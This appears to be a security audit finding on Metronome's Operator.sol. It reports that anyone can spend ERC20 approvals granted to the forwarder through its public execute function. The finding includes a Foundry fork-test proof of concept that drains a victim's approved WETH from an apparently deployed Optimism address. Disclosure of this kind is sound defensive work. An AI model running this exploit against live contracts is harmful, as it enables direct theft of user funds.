### Title
Approvals granted to the `Operator` contract are spendable by anyone via `Operator.execute` - (File: contracts/Operator.sol)

### Summary
Metronome's `Operator` is a multicall/forwarder that lets users batch protocol interactions (`approve` + `deposit` + `leverage`, etc.) in a single transaction. `Operator.execute` performs arbitrary calls to arbitrary targets with `Operator` itself as `msg.sender`. Only `SynthContext`-aware contracts (Pool, DepositToken, DebtToken, gateways, SmartFarmingManager) resolve the real sender through `SynthContext._msgSender()` → `Operator.getActualMsgSender()`. Plain ERC20s — the underlying collateral tokens (WETH, USDC, vTokens, etc.) — are not `SynthContext`-aware: when `Operator` calls `token.transferFrom(victim, attacker, amount)`, the token sees `msg.sender == Operator` and consumes `allowance[victim][Operator]`.

This is the direct analog of the Knox vault issue: a "friendly" protocol contract address that users approve is not bound to any owner check — *any* EOA can invoke `execute` and exercise a standing approval granted by a victim to the `Operator` address, forever, until revoked.

### Finding Description
`contracts/Operator.sol` lines 20-55:

```solidity
modifier setMsgSender() {
    MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
    _;
    ...
}

function execute(Call[] calldata calls_) external payable override nonReentrant setMsgSender returns (bytes[] memory) {
    ...
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    ...
}
```

- `execute` is `public`/`payable`, callable by any EOA with fully attacker-chosen `target` and `callData`.
- The transient `MSG_SENDER` slot only matters for `SynthContext` contracts (`SynthContext._msgSender()` at `contracts/utils/SynthContext.sol:14-24` resolves it). An ERC20 like WETH sees only `msg.sender == Operator`.
- Because `Operator` is *the* sanctioned front-end entry point for Synth interactions ("Execute calls on sender's behalf"), users interacting through it can end up granting ERC20 approvals to the `Operator` address — e.g., a user who wants `Operator` to pull tokens on their behalf within a multicall, or who approves the wrong spender believing `Operator` is the contract that will pull funds. Notably, an `approve` inside an `execute` batch silently does the wrong thing (grants `allowance[Operator][spender]` instead of `allowance[user][spender]`), which trains users to pre-approve `Operator` directly.
- Once `token.allowance(victim, Operator) > 0` exists on any valuable ERC20, any attacker calls:
  `Operator.execute([{target: token, value: 0, callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, allowance))}])`
  and drains the victim's approved balance. The approval persists until manually revoked — matching the "forgot to reset `setApprovalForAll`" persistence in the Knox report.

Invariant broken: identity/authorization — an allowance granted to a specific contract is exercised at the direction of an unrelated third party, with no binding between the approval grant and the caller of `execute`.

Guards that do *not* stop it: `nonReentrant` (irrelevant — no reentrancy needed), `setMsgSender` (only honored by SynthContext contracts, not plain ERC20s), pause/shutdown flags (Operator has none), and per-token `onlyIf...` modifiers (the call is to an external token, not a Synth contract). `DepositToken`/`SyntheticToken` approvals are *not* exploitable this way because their `transferFrom` resolves `_msgSender()` to the `execute` caller — the exposure is exactly on SynthContext-unaware tokens approved to `Operator`.

### Impact Explanation
Direct theft of user funds: any ERC20 allowance from a victim to the deployed `Operator` address (deployed on Optimism `0x49219d2f...`, Swell `0xE002C5C9...`, Plasma `0x5173C8e2...`, etc.) can be spent by anyone, into any recipient, at any time. Since `Operator` is unversioned and permanently registered in `PoolRegistry`, stale approvals are exploitable indefinitely.

### Likelihood Explanation
Precondition is a victim holding `allowance[victim][Operator] > 0` on some token — the same precondition class as the Knox report (victim must approve the "friendly" address). The Operator's stated purpose (batching calls "on sender's behalf", including token-moving calls like `transferFrom` which genuinely require the user to approve `Operator` to work inside `execute`) makes such approvals realistic rather than accidental. Exploitation is a single public `execute` call by any EOA; no privileged role, oracle, or timing requirement.

### Recommendation
Bind forwarded calls to the initiator. Options:
- In `Operator.execute`, block calls to arbitrary token contracts, or at minimum document/reject `transferFrom`-style calls, and add a selector allowlist (e.g., only SynthContext-aware protocol targets).
- Have SynthContext-aware contracts verify, and for all others, return the approval concern: make `Operator` use `permit`/signature-based intents rather than standing allowances — e.g., accept a signed payload proving the token owner authorizes this specific batch, so a third party cannot replay someone else's approval.
- At minimum, emit clear warnings in docs/UX that `Operator` must never be a spender, and add an on-chain `isAllowedTarget` registry maintained by governance.

### Proof of Concept
Foundry fork test (e.g., Optimism fork; `Operator` at `0x49219d2feCA183b26F058388e36bbfb139Bf08EC`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IOperator {
    struct Call { address target; uint256 value; bytes callData; }
    function execute(Call[] calldata) external payable returns (bytes[] memory);
}
interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract OperatorApprovalLeech is Test {
    function test_stealViaOperatorApproval() public {
        IOperator operator = IOperator(OPERATOR);
        IERC20 weth = IERC20(WETH);            // any ERC20
        address victim = WHALE;                // holder that approved Operator
        address eve = makeAddr("eve");

        // Victim (previously) approved the "trusted" Operator:
        vm.prank(victim);
        weth.approve(address(operator), type(uint256).max);

        uint256 amt = weth.balanceOf(victim);
        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(weth),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (victim, eve, amt))
        });

        vm.prank(eve);                         // unrelated EOA
        operator.execute(calls);

        assertEq(weth.balanceOf(victim), 0);
        assertEq(weth.balanceOf(eve), amt);
    }
}
```

The same pattern works in-unit (no fork) by deploying `Operator`, a mock `PoolRegistry` returning it from `operator()`, and an `ERC20Mock`: `victim.approve(operator, …)` then `eve → operator.execute(transferFrom(victim→eve))` succeeds because the mock ERC20 sees `msg.sender == operator` and consumes `allowance[victim][operator]`.
